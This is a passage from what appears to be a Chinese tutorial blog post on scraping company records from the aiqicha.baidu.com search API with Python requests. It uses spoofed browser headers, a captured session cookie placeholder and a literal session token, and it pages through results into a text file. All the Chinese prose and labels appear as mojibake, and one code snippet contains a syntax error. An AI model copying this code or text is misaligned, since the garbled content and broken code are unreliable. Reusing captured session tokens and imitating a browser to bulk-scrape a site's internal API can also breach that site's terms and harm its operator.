class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&#x27;æŠ“åˆ°çš„cookie&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;aiqicha.baidu.com&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Ch-Ua&#x27;</span>: <span class="string">&#x27;&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Ch-Ua-Mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Ch-Ua-Platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Ymg_ssr&#x27;</span>: <span class="string">&#x27;1686132225976_1686209020456_Krd2ws59qA1TALmBzJb0wdzDayRK14xrDbs2NsxGZghPtW2AaG8K4Now6K/zTfBecE9i1aegJL5KTT+cxrK6j9JK2ix9MoT8+qWljBqcj0i1PEU+RTVvgGjdlkPqamJydND6fQSkBidmHrZVhBXKSiqByC1knHzxmFJl0d+FYKOIK5Yue9P/KBLU2Q3FIF1YsrkslH8qYriHAg5MNXzRTlrU4gdLir4fXP++E+JwOUR2jkA8Mv4vTuUOG7crcKk2W+omKed78e4P6vi6j3qgdk6Pc4jel6aItYE8iTIAZCAcJNP4raFja3p6Eb/KAqre&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Zx-Open-Url&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.æ„é€ paramså‚æ•°å¦‚å›¾æ‰€ç¤º</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;p&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;s&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;&#123;&quot;regCap&quot;:[&#123;&quot;start&quot;:5000,&quot;end&quot;:0&#125;],&quot;regCapType&quot;:[&quot;1&quot;],&quot;openStatus&quot;:[&quot;å¼€ä¸š&quot;]&#125;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;o&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.çˆ¬è™«å®ç°ä»£ç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;p&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;s&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;&#123;&quot;regCap&quot;:[&#123;&quot;start&quot;:5000,&quot;end&quot;:0&#125;],&quot;regCapType&quot;:[&quot;1&quot;],&quot;openStatus&quot;:[&quot;å¼€ä¸š&quot;]&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;o&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&#x27;æŠ“åˆ°çš„cookie&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;aiqicha.baidu.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua&#x27;</span>: <span class="string">&#x27;&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Ymg_ssr&#x27;</span>: <span class="string">&#x27;1686132225976_1686209020456_Krd2ws59qA1TALmBzJb0wdzDayRK14xrDbs2NsxGZghPtW2AaG8K4Now6K/zTfBecE9i1aegJL5KTT+cxrK6j9JK2ix9MoT8+qWljBqcj0i1PEU+RTVvgGjdlkPqamJydND6fQSkBidmHrZVhBXKSiqByC1knHzxmFJl0d+FYKOIK5Yue9P/KBLU2Q3FIF1YsrkslH8qYriHAg5MNXzRTlrU4gdLir4fXP++E+JwOUR2jkA8Mv4vTuUOG7crcKk2W+omKed78e4P6vi6j3qgdk6Pc4jel6aItYE8iTIAZCAcJNP4raFja3p6Eb/KAqre&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Zx-Open-Url&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;https://aiqicha.baidu.com/s/advanceSearchAjax&quot;</span></span><br><span class="line">    response = requests.get(url, headers=headers, params=params)</span><br><span class="line">    resultList = response.json()[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;resultList&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> resultList:</span><br><span class="line">        <span class="built_in">print</span>(item)</span><br><span class="line">        <span class="built_in">print</span>(item[<span class="string">&#x27;entName&#x27;</span>])</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>4.æˆåŠŸçˆ¬å–ç»“æœ:<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011550787.png" alt="image.png"></p><p>ä¸browserè®¿é—®ä¸€è‡´<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011551205.png" alt="image.png"></p><p>5.çˆ¬å–å†…å®¹åä¿å­˜è‡³æ–‡ä»¶ä¸­</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">n</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment">#å†™å…¥æ–‡ä»¶</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./a.txt&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;p&quot;</span>: <span class="string">&quot;1&quot;</span>.</span><br><span class="line">        <span class="string">&quot;s&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;&#123;&quot;regCap&quot;:[&#123;&quot;start&quot;:5000,&quot;end&quot;:0&#125;],&quot;regCapType&quot;:[&quot;1&quot;],&quot;openStatus&quot;:[&quot;å¼€ä¸š&quot;]&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;o&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&#x27;æŠ“åˆ°çš„cookie&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;aiqicha.baidu.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua&#x27;</span>: <span class="string">&#x27;&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Ymg_ssr&#x27;</span>: <span class="string">&#x27;1686132225976_1686209020456_Krd2ws59qA1TALmBzJb0wdzDayRK14xrDbs2NsxGZghPtW2AaG8K4Now6K/zTfBecE9i1aegJL5KTT+cxrK6j9JK2ix9MoT8+qWljBqcj0i1PEU+RTVvgGjdlkPqamJydND6fQSkBidmHrZVhBXKSiqByC1knHzxmFJl0d+FYKOIK5Yue9P/KBLU2Q3FIF1YsrkslH8qYriHAg5MNXzRTlrU4gdLir4fXP++E+JwOUR2jkA8Mv4vTuUOG7crcKk2W+omKed78e4P6vi6j3qgdk6Pc4jel6aItYE8iTIAZCAcJNP4raFja3p6Eb/KAqre&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Zx-Open-Url&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;https://aiqicha.baidu.com/s/advanceSearchAjax&quot;</span></span><br><span class="line">    response = requests.get(url, headers=headers, params=params)</span><br><span class="line">    result = response.json()[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;resultList&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> result:</span><br><span class="line">        a = <span class="string">&quot;å…¬å¸åç§°:&quot;</span>+item[<span class="string">&#x27;entName&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;æ³¨å†Œèµ„é‡‘:&quot;</span>+item[<span class="string">&#x27;regCap&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;å…¬å¸ç±»å‹:&quot;</span>+item[<span class="string">&#x27;entType&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;å…¬å¸æˆç«‹æ—¶é—´:&quot;</span>+item[<span class="string">&#x27;validityFrom&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;å…¬å¸åœ°å€:&quot;</span>+item[<span class="string">&quot;domicile&quot;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&#x27;å¼€ä¸šçŠ¶å†µ:&#x27;</span>+item[<span class="string">&quot;openStatus&quot;</span>]+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        f.write(a)</span><br><span class="line"></span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011551558.png" alt="image.png"></p><p>6.çˆ¬å–å¤šé¡µä¿¡æ¯</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">n</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment">#å†™å…¥æ–‡ä»¶</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./a.txt&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">    m = <span class="built_in">str</span>(n)</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;p&quot;</span>: m,</span><br><span class="line">        <span class="string">&quot;s&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;&#123;&quot;regCap&quot;:[&#123;&quot;start&quot;:5000,&quot;end&quot;:0&#125;],&quot;regCapType&quot;:[&quot;1&quot;],&quot;openStatus&quot;:[&quot;å¼€ä¸š&quot;]&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;o&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&#x27;æŠ“åˆ°çš„cookie&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;aiqicha.baidu.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua&#x27;</span>: <span class="string">&#x27;&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Ymg_ssr&#x27;</span>: <span class="string">&#x27;1686132225976_1686209020456_Krd2ws59qA1TALmBzJb0wdzDayRK14xrDbs2NsxGZghPtW2AaG8K4Now6K/zTfBecE9i1aegJL5KTT+cxrK6j9JK2ix9MoT8+qWljBqcj0i1PEU+RTVvgGjdlkPqamJydND6fQSkBidmHrZVhBXKSiqByC1knHzxmFJl0d+FYKOIK5Yue9P/KBLU2Q3FIF1YsrkslH8qYriHAg5MNXzRTlrU4gdLir4fXP++E+JwOUR2jkA8Mv4vTuUOG7crcKk2W+omKed78e4P6vi6j3qgdk6Pc4jel6aItYE8iTIAZCAcJNP4raFja3p6Eb/KAqre&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Zx-Open-Url&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;https://aiqicha.baidu.com/s/advanceSearchAjax&quot;</span></span><br><span class="line">    response = requests.get(url, headers=headers, params=params)</span><br><span class="line">    result = response.json()[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;resultList&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> result:</span><br><span class="line">        a = <span class="string">&quot;å…¬å¸åç§°:&quot;</span>+item[<span class="string">&#x27;entName&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;æ³¨å†Œèµ„é‡‘:&quot;</span>+item[<span class="string">&#x27;regCap&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;å…¬å¸ç±»å‹:&quot;</span>+item[<span class="string">&#x27;entType&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;å…¬å¸æˆç«‹æ—¶é—´:&quot;</span>+item[<span class="string">&#x27;validityFrom&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;å…¬å¸åœ°å€:&quot;</span>+item[<span class="string">&quot;domicile&quot;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&#x27;å¼€ä¸šçŠ¶å†µ:&#x27;</span>+item[<span class="string">&quot;openStatus&quot;</span>]+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        f.write(a)</span><br><span class="line"></span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(<span class="number">1</span>)</span><br><span class="line">    main(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>æˆåŠŸçˆ¬å–<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011552327.png" alt="image.png"></p><p>è¿ç”¨forå¾ªç¯çˆ¬å–å¤šé¡µ</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">n</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment">#å†™å…¥æ–‡ä»¶</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./a.txt&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">    m = <span class="built_in">str</span>(n)</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;p&quot;</span>: m,</span><br><span class="line">        <span class="string">&quot;s&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;&#123;&quot;regCap&quot;:[&#123;&quot;start&quot;:5000,&quot;end&quot;:0&#125;],&quot;regCapType&quot;:[&quot;1&quot;],&quot;openStatus&quot;:[&quot;å¼€ä¸š&quot;]&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;o&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&#x27;æŠ“å–çš„cookie&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;aiqicha.baidu.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua&#x27;</span>: <span class="string">&#x27;&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Ymg_ssr&#x27;</span>: <span class="string">&#x27;1686132225976_1686209020456_Krd2ws59qA1TALmBzJb0wdzDayRK14xrDbs2NsxGZghPtW2AaG8K4Now6K/zTfBecE9i1aegJL5KTT+cxrK6j9JK2ix9MoT8+qWljBqcj0i1PEU+RTVvgGjdlkPqamJydND6fQSkBidmHrZVhBXKSiqByC1knHzxmFJl0d+FYKOIK5Yue9P/KBLU2Q3FIF1YsrkslH8qYriHAg5MNXzRTlrU4gdLir4fXP++E+JwOUR2jkA8Mv4vTuUOG7crcKk2W+omKed78e4P6vi6j3qgdk6Pc4jel6aItYE8iTIAZCAcJNP4raFja3p6Eb/KAqre&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Zx-Open-Url&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;https://aiqicha.baidu.com/s/advanceSearchAjax&quot;</span></span><br><span class="line">    response = requests.get(url, headers=headers, params=params)</span><br><span class="line">    result = response.json()[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;resultList&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> result:</span><br><span class="line">        a = <span class="string">&quot;å…¬å¸åç§°:&quot;</span>+item[<span class="string">&#x27;entName&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;æ³¨å†Œèµ„é‡‘:&quot;</span>+item[<span class="string">&#x27;regCap&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;å…¬å¸ç±»å‹:&quot;</span>+item[<span class="string">&#x27;entType&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;å…¬å¸æˆç«‹æ—¶é—´:&quot;</span>+item[<span class="string">&#x27;validityFrom&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;å…¬å¸åœ°å€:&quot;</span>+item[<span class="string">&quot;domicile&quot;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&#x27;å¼€ä¸šçŠ¶å†µ:&#x27;</span>+item[<span class="string">&quot;openStatus&quot;</span>]+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        f.write(a)</span><br><span class="line"></span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">        main(i)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011553015.png" alt="image.png"></p><h1 id="4-å¤šçº¿ç¨‹çˆ¬è™«"><a href="#4-å¤šçº¿ç¨‹çˆ¬è™«" class="headerlink" title="4.å¤šçº¿ç¨‹çˆ¬è™«"></a>4.å¤šçº¿ç¨‹çˆ¬è™«</h1><h3 id="1-æ™®é€šçˆ¬è™«"><a href="#1-æ™®é€šçˆ¬è™«" class="headerlink" title="1.æ™®é€šçˆ¬è™«"></a>1.æ™®é€šçˆ¬è™«</h3><p>çˆ¬å–çˆ±ä¼æŸ¥500é¡µæ•°æ®</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">n</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment">#å†™å…¥æ–‡ä»¶</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./a.txt&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">    m = <span class="built_in">str</span>(n)</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;p&quot;</span>: m,</span><br><span class="line">        <span class="string">&quot;s&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;&#123;&quot;regCap&quot;:[&#123;&quot;start&quot;:5000,&quot;end&quot;:0&#125;],&quot;regCapType&quot;:[&quot;1&quot;],&quot;openStatus&quot;:[&quot;å¼€ä¸š&quot;]&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;o&quot;</span>: 